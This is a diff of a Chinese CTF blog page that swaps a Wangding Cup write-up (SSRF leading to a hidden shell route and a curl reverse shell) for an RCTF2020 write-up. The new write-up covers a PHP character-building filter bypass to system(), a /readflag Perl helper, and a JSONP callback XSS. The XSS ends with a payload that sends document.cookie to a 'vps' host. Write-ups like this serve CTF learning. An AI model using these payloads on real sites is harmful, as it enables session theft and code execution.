@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="2020网鼎杯白虎组webwriteup, Fortheone">
+    <meta name="keywords" content="RCTF2020复现, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>2020网鼎杯白虎组webwriteup | Fortheone</title>
+    <title>RCTF2020复现 | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2020网鼎杯白虎组webwriteup</h1>
+                    <h1 class="description center-align post-title">RCTF2020复现</h1>
                 </div>
             </div>
         </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-15
+                    2020-06-03
                 </div>
                 
 
@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    627
+                    2.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    11 分
                 </div>
                 
 
@@ -456,93 +456,213 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="web-picdown">web picdown</h3>
-<p>给了一个ssrf的点，过滤了file协议，但是测试发现题目环境是python</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1589472822653.png" alt></p>
-<p>python里的urllib.fopen是支持local-file协议的</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515001748.png" alt></p>
-<p>通过cmdline读到运行脚本文件为 <code>main.py</code></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515001806.png" alt></p>
-<pre><code>from flask import Flask, Response
-from flask import render_template
-from flask import request
-import os
-import urllib
-
-app = Flask(__name__)
-
-SECRET_FILE = &quot;/tmp/secret.txt&quot;
-f = open(SECRET_FILE)
-SECRET_KEY = f.read().strip()
-os.remove(SECRET_FILE)
-
-
-@app.route('/')
-def index():
-    return render_template('search.html')
-
-
-@app.route('/page')
-def page():
-    url = request.args.get(&quot;url&quot;)
-    try:
-        if not url.lower().startswith(&quot;file&quot;):
-            res = urllib.urlopen(url)
-            value = res.read()
-            response = Response(value, mimetype='application/octet-stream')
-            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
-            return response
-        else:
-            value = &quot;HACK ERROR!&quot;
-    except:
-        value = &quot;SOMETHING WRONG!&quot;
-    return render_template('search.html', res=value)
-
-
-@app.route('/no_one_know_the_manager')
-def manager():
-    key = request.args.get(&quot;key&quot;)
-    print(SECRET_KEY)
-    if key == SECRET_KEY:
-        shell = request.args.get(&quot;shell&quot;)
-        os.system(shell)
-        res = &quot;ok&quot;
-    else:
-        res = &quot;Wrong Key!&quot;
-
-    return res
-
-
-if __name__ == '__main__':
-app.run(host='0.0.0.0', port=8080)
+                <h3 id="calc">calc</h3>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200603131200.png" alt></p>
+<p>这题是和师傅们一起做出来的，主要是通过php的各种数学运算，从可输入的字符中运算出其他要利用的字符。</p>
+<pre><code>&lt;?php
+error_reporting(0);
+echo ((1/0).(0/0));
+echo &quot;&lt;/br&gt;=================================&lt;/br&gt;&quot;;
+for($i=0;$i&lt;6;$i++){
+for($j=0;$j&lt;10;$j++){
+echo $i.$j;
+echo ((($j).(0){1})|((1/0).(0/0)){$i});
+}
+}
+echo &quot;&lt;/br&gt;=================================&lt;/br&gt;&quot;;
+for($i=0;$i&lt;6;$i++){
+for($j=0;$j&lt;6;$j++){
+echo $i.$j;
+echo ((((1/0).(0/0)){$i})|(((1/0).(0/0)){$j}));
+}
+}
+echo &quot;&lt;/br&gt;=================================&lt;/br&gt;&quot;;
+for($i=0;$i&lt;6;$i++){
+for($j=0;$j&lt;6;$j++){
+echo ((((1/0).(0/0)){$i})&amp;(((1/0).(0/0)){$j}));
+}
+} // 0123456789abcdefg
+$dic = &quot;ABCDEFGHIJKLMNOpqrstuvwxyz0123456789{}~@&quot;;
+echo &quot;&lt;/br&gt;=================================&lt;/br&gt;&quot;;
+for($i=0;$i&lt;40;$i++){
+for($j=0;$j&lt;40;$j++){
+echo ($dic{$i}|$dic{$j});
+}
+}
+$a = &quot;&quot;;
+echo &quot;&lt;/br&gt;=================================&lt;/br&gt;&quot;;
+for($i=0;$i&lt;18;$i++){
+for($j=0;$j&lt;18;$j++){
+echo $i.$j;
+echo ($dic{$i}&amp;$dic{$j});
+$a = $a . ($dic{$i}&amp;$dic{$j});
+}
+}
+echo &quot;&lt;/br&gt;=================================&lt;/br&gt;&quot;;
+echo $a;
+echo &quot;&lt;/br&gt;=================================&lt;/br&gt;&quot;;
+for($i=0;$i&lt;strlen($a);$i++){
+for($j=0;$j&lt;strlen($a);$j++){
+echo ($a{$i}|$a{$j});
+}
+}
+echo &quot;&lt;/br&gt;=================================&lt;/br&gt;&quot;;
+for($i=0;$i&lt;strlen($a);$i++){
+for($j=0;$j&lt;strlen($a);$j++){
+echo ($a{$i}&amp;$a{$j});
+}
+}
+echo &quot;&lt;/br&gt;=================================&lt;/br&gt;&quot;;
+?&gt;
 </code></pre>
-<p>很熟悉的打开了secret文件然后删除，要求得到secret中的key。因为打开过这个文件，所以可以通过proc/self/fd来找到这个文件，测试到在/proc/self/fd/3</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515001932.png" alt></p>
-<p>输入key和shell，反弹shell，这里get传参不能有特殊符合，所以使用curl反弹shell</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002011.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002040.png" alt></p>
-<h3 id="web-StarBucket">web StarBucket</h3>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002105.png" alt></p>
-<p>题目的功能是亚马逊的aws资源管理功能，随便选个文件抓包看看。点击showflag 显示not admin</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002136.png" alt></p>
-<p>大概意思是上传一个文件到image/b20a86e63bfb0b4a59ba38da009f9793/avatar.jpg 覆盖这个文件。F12看到一个app.js</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002150.png" alt></p>
-<p>访问了两个路径，一个是userinfo/userid/info.js，另一个暂时不知道，刚好给了我们userid访问下第一个路径看看。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002201.png" alt></p>
-<p>下载下来打开是这样的内容。那题目意思就明确了，就是用这个覆盖功能去覆盖userinf/userid/info.js文件下的内容。</p>
-<p>所以按照条件修改。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002228.png" alt></p>
-<p>注意这个acl权限要改为public-read-write</p>
-<p>Policy也要根据上面的内容修改，但是发包过去发现</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002242.png" alt></p>
-<p>提示签名不匹配，这才发现最下面还有一个X-Amz-Signature，也就是根据上面的内容生成的签名，比赛的时候一直在想去找它的签名算法去构造。不过赛后才发现我看到的第一个app.js里有一个生成签名的文件 signature.php</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002303.png" alt></p>
-<p>只要根据我们的内容填写，然后访问这个文件</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/acl.png" alt></p>
-<p>就全部生成好了，最后只要根据这个返回值的内容再次修改上传的请求包。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002406.png" alt></p>
-<p>就成功的覆盖了info.js的内容，点击show flag</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/20200515002422.png" alt></p>
+<p>得到字符集</p>
+<pre><code>{ (((2).(0){1})|((1/0).(0/0)){0})
+} (((4).(0){1})|((1/0).(0/0)){0})
+~ (((0).(0){1})|((1/0).(0/0)){1})
+A (((1/0).(0/0)){4})
+B ((((2).(0){1})|((1/0).(0/0)){0})%26(((1/0).(0/0)){2}))
+C ((((2).(0){1})|((1/0).(0/0)){0})%26((((1/0).(0/0)){2})|((1/0).(0/0)){4}))
+D ((((4).(0){1})|((1/0).(0/0)){0})%26(((1/0).(0/0)){2}))
+E ((((4).(0){1})|((1/0).(0/0)){0})%26((((1/0).(0/0)){2})|((1/0).(0/0)){4}))
+F (((1/0).(0/0)){2})
+G ((((1/0).(0/0)){2})|((1/0).(0/0)){4})
+H ((((1/0).(0/0)){0})%26(((1/0).(0/0)){1}))
+I (((1/0).(0/0)){0})
+J (((((1/0).(0/0)){1})|((1/0).(0/0)){1})%26(((2).(0){1})|((1/0).(0/0)){0}))
+K ((((2).(0){1})|((1/0).(0/0)){0})%26(((((1/0).(0/0)){0})|(((1/0).(0/0)){1}))))
+L ((((4).(0){1})|((1/0).(0/0)){0})%26((((1/0).(0/0)){1})|((1/0).(0/0)){1}))
+M ((((4).(0){1})|((1/0).(0/0)){0})%26(((((1/0).(0/0)){0})|(((1/0).(0/0)){1}))))
+N ((((1/0).(0/0)){1})|((1/0).(0/0)){1})
+O (((((1/0).(0/0)){0})|(((1/0).(0/0)){1})))
+p ((((1).(0){0})|((1/0).(0/0)){0})%26(((2).(0){0})|((1/0).(0/0)){2}))
+q (((0).(0){1})|((1/0).(0/0)){4})
+r ((((2).(0){1})|((1/0).(0/0)){0})%26(((2).(0){0})|((1/0).(0/0)){2}))
+s (((2).(0){1})|((1/0).(0/0)){4})
+t ((((4).(0){1})|((1/0).(0/0)){0})%26(((2).(0){0})|((1/0).(0/0)){2}))
+u (((4).(0){1})|((1/0).(0/0)){4})
+v (((2).(0){0})|((1/0).(0/0)){2})
+w (((1).(0){1})|((1/0).(0/0)){2})
+x ((((1).(0){0})|((1/0).(0/0)){0})%26(((0).(0){1})|((1/0).(0/0)){1}))
+y (((1).(0){0})|((1/0).(0/0)){0})
+z ((((2).(0){1})|((1/0).(0/0)){0})%26(((0).(0){1})|((1/0).(0/0)){1}))
+' ((((((2).(0){0})|((1/0).(0/0)){0}).(((1).(0){0})|((1/0).(0/0)){0}).(((2).(0){0})|((1/0).(0/0)){0}))%26(((((1/0).(0/0)){2})|((1/0).(0/0)){4}).((((1/0).(0/0)){1})|((1/0).(0/0)){1}).(((2).(0){0})|((1/0).(0/0)){2})))(39))
+&quot; ((((((2).(0){0})|((1/0).(0/0)){0}).(((1).(0){0})|((1/0).(0/0)){0}).(((2).(0){0})|((1/0).(0/0)){0}))%26(((((1/0).(0/0)){2})|((1/0).(0/0)){4}).((((1/0).(0/0)){1})|((1/0).(0/0)){1}).(((2).(0){0})|((1/0).(0/0)){2})))(34))
+_ ((((((2).(0){0})|((1/0).(0/0)){0}).(((1).(0){0})|((1/0).(0/0)){0}).(((2).(0){0})|((1/0).(0/0)){0}))%26(((((1/0).(0/0)){2})|((1/0).(0/0)){4}).((((1/0).(0/0)){1})|((1/0).(0/0)){1}).(((2).(0){0})|((1/0).(0/0)){2})))(95))
+$ ((((((2).(0){0})|((1/0).(0/0)){0}).(((1).(0){0})|((1/0).(0/0)){0}).(((2).(0){0})|((1/0).(0/0)){0}))%26(((((1/0).(0/0)){2})|((1/0).(0/0)){4}).((((1/0).(0/0)){1})|((1/0).(0/0)){1}).(((2).(0){0})|((1/0).(0/0)){2})))(36))
+, ((((((2).(0){0})|((1/0).(0/0)){0}).(((1).(0){0})|((1/0).(0/0)){0}).(((2).(0){0})|((1/0).(0/0)){0}))%26(((((1/0).(0/0)){2})|((1/0).(0/0)){4}).((((1/0).(0/0)){1})|((1/0).(0/0)){1}).(((2).(0){0})|((1/0).(0/0)){2})))(44))
+</code></pre>
+<p>构造出 system(next(getallheaders()))然后通过burp操作  ,执行readflag发现要计算一个式子，将perl脚本上传到服务器/tmp目录下，然后执行拿flag。</p>
+<pre><code>use strict;
+use IPC::Open3;
+
+my $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, '/readflag' )
+  or die &quot;open3() failed $!&quot;;
+
+my $r;
+$r = &lt;CHLD_OUT&gt;;
+print &quot;$r&quot;;
+$r = &lt;CHLD_OUT&gt;;
+print &quot;$r&quot;;
+$r = eval &quot;$r&quot;;
+print &quot;$r\n&quot;;
+print CHLD_IN &quot;$r\n&quot;;
+$r = &lt;CHLD_OUT&gt;;
+print &quot;$r&quot;;
+$r = &lt;CHLD_OUT&gt;;
+print &quot;$r&quot;;
+</code></pre>
+<h3 id="easyblog">easyblog</h3>
+<p>赛后复现的</p>
+<p>首先是注册登录 然后可以发表文章，发表评论，还可以report，所以很明显是xss的题。</p>
+<p>看一下文章处的js内容</p>
+<pre><code>function addComments(comments) {
+        comments.forEach(function (comment) {
+          let html = `
+          &lt;div class=&quot;panel panel-default&quot;&gt;
+              &lt;div class=&quot;panel-heading&quot;&gt;
+                &lt;span class=&quot;name&quot;&gt;&lt;/span&gt;
+                &lt;div class=&quot;pull-right&quot;&gt;
+                    &lt;button type=&quot;button&quot; class=&quot;btn btn-default btn-xs like&quot; data-id=&quot;${comment.id}&quot;&gt;
+                      &lt;span class=&quot;glyphicon glyphicon-thumbs-up&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;&lt;span&gt;${comment.like}&lt;/span&gt;
+                    &lt;/button&gt;
+                    &lt;button type=&quot;button&quot; class=&quot;btn btn-default btn-xs dislike&quot; data-id=&quot;${comment.id}&quot;&gt;
+                      &lt;span class=&quot;glyphicon glyphicon-thumbs-down&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;&lt;span&gt;${comment.dislike}&lt;/span&gt;
+                    &lt;/button&gt;
+                &lt;/div&gt;
+              &lt;/div&gt;
+              &lt;div class=&quot;panel-body&quot;&gt;&lt;/div&gt;
+            &lt;/div&gt;
+          `;
+          dom = $(html)
+          dom.find('div&gt;.name').text(comment.name)
+          dom.find('.panel-body').html(comment.comment)
+          $('#comments').append(dom)
+        })
+      }
+      function getUrlParam(name) {
+        var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;)
+        var r = window.location.search.substr(1).match(reg)
+        if (r != null) return unescape(r[2])
+        return null
+      }
+
+      $.get('?page=comments&amp;cb=addComments&amp;id=' + getUrlParam('id'))
+      $('#comments').on('click','button', function(e) {
+        let btn = $(e.currentTarget)
+        if (btn.hasClass('like')) {
+          $.get('?page=vote&amp;op=like&amp;id=' + btn.data('id'), function(e) {
+            let count = parseInt(btn.children('span:last-child').text())
+            btn.children('span:last-child').text(count + 1)
+          })
+        } else if(btn.hasClass('dislike')) {
+          $.get('?page=vote&amp;op=dislike&amp;id=' + btn.data('id'), function(e) {
+            let count = parseInt(btn.children('span:last-child').text())
+            btn.children('span:last-child').text(count + 1)
+          })
+        }
+      })
+</code></pre>
+<p>通过jquery发送一个get请求访问 ?page=comments&amp;cb=addCommetns&amp;id=id</p>
+<p>拼接这个路径去看一下返回的内容是什么</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1591167465069.png" alt></p>
+<p>出现了addComments([])，刚好传入的url中也有addComments这一参数，所以可以知道服务端是用的jsonp来传递数据，通过callback来获取评论。</p>
+<p>而题目中提示了zepto库有问题，可以去看看源码。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1591167669285.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1591167703196.png" alt></p>
+<p>如果请求的数据类型是jsonp，则会给返回的数据加上script标签。而返回的数据我们可控的有评论的内容，和callback参数。</p>
+<p>但是如果控制评论的内容，再经过callback接收回来是无法触发xss的。而如果我们控制了callback参数使payload放在返回数据的最前面，就可以触发xss。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1591168590124.png" alt></p>
+<p>但callback在js中的jqery中已经确定了，我们能不能更改呢？ 当然可以。</p>
+<pre><code>      function getUrlParam(name) {
+        var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;)
+        var r = window.location.search.substr(1).match(reg)
+        if (r != null) return unescape(r[2])
+        return null
+      }
+</code></pre>
+<p>我们看这个取id的函数，修改一下，让它打印出整个数组。</p>
+<pre><code>      function getUrlParam1(name) {
+        var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;)
+        var r = window.location.search.substr(1).match(reg)
+        if (r != null) return unescape(r)
+        return null
+      }
+      
+getUrlParam1('id')
+&quot;&amp;id=1b1b6cfe-225a-4b2e-8a05-c64e9a59d01e,&amp;,1b1b6cfe-225a-4b2e-8a05-c64e9a59d01e,&quot;
+</code></pre>
+<p>它会取到传入的参数中id的值，所以如果我们能在这个id的值中插入callback参数就可以覆盖前面callback的值。</p>
+<p>所以让<code>id=1b1b6cfe-225a-4b2e-8a05-c64e9a59d01e%26cb=alert(1)</code></p>
+<p>取到的id的值即为 <code>1b1b6cfe-225a-4b2e-8a05-c64e9a59d01e&amp;cb=alert(1)</code></p>
+<p>在url中一定要将cb前的&amp;用url编码，否则js会将cb作为另一个参数名，而导致取不到。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/1591169268779.png" alt></p>
+<p>但是如果我们直接用cb参数去打，会有长度限制。所以可以将payload写到当前文章中，通过dom节点获取payload再执行。</p>
+<p>新建一篇文章内容为 <code>&lt;input id=&quot;m&quot; value=&quot;window.open('http://vps:1234?flag='+document.cookie)&quot;&gt;</code></p>
+<p>然后再构造url <code>?page=show&amp;id=1b1b6cfe-225a-4b2e-8a05-c64e9a59d01e%26cb=eval(m.value)&amp;id=1b1b6cfe-225a-4b2e-8a05-c64e9a59d01e</code></p>
+<p>后面为什么还要再加上一个id，是因为原本的id因为加上了%26=eval(m.value)</p>
+<p>通过 getUrlParam得到的id就变成了 <code>1b1b6cfe-225a-4b2e-8a05-c64e9a59d01e&amp;cb=eval(m.value),</code></p>
+<p>而根据这个id来寻找文章，肯定是找不到文章的，自然也就找不到m节点，所以要在后面再加上一个id来确定到这篇文章。</p>
+<p>然后在report处把url传给admin，后面的校验写个php脚本就能跑出来，纯数字。得到admin的session后，在文章里可以看到flag。</p>
 
             </div>
             <hr>
@@ -568,7 +688,7 @@ app.run(host='0.0.0.0', port=8080)
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/05/15/2020网鼎杯白虎组/">http://yoursite.com/year/05/15/2020网鼎杯白虎组/</a>
+                    <a href="http://yoursite.com/year/06/03/RCTF2020/">http://yoursite.com/year/06/03/RCTF2020/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1034,7 +1154,8 @@ app.run(host='0.0.0.0', port=8080)
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/year/06/03/RCTF2020/">
                     <div class="card-image">
@@ -1058,9 +1179,9 @@ echo &quot;&lt
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-06-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1073,6 +1194,7 @@ echo &quot;&lt
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1083,33 +1205,38 @@ echo &quot;&lt
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/04/10/鸡肋漏洞组合拳/">
+                <a href="/year/05/15/2020网鼎杯白虎组/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="鸡肋漏洞组合拳">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="2020网鼎杯白虎组webwriteup">
                         
-                        <span class="card-title">鸡肋漏洞组合拳</span>
+                        <span class="card-title">2020网鼎杯白虎组webwriteup</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x00 前言
-最近在挖业务漏洞的时候想起了之前看到过的JSONP劫持，CORS跨域漏洞。这种涉及敏感信息的漏洞一般都是中危以上，并且测试方式简单，所以这次打算研究一下。刚好在昨天碰到了一个涉及到敏感信息的接口，所以在此记录一下。
-0x01
+                            web picdown
+给了一个ssrf的点，过滤了file协议，但是测试发现题目环境是python
+
+python里的urllib.fopen是支持local-file协议的
+
+通过cmdline读到运行脚本文件为 main.py
+
+fr
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-15
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/渗透测试/" class="post-category">
-                                    渗透测试
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
                                 </a>
                             
                             
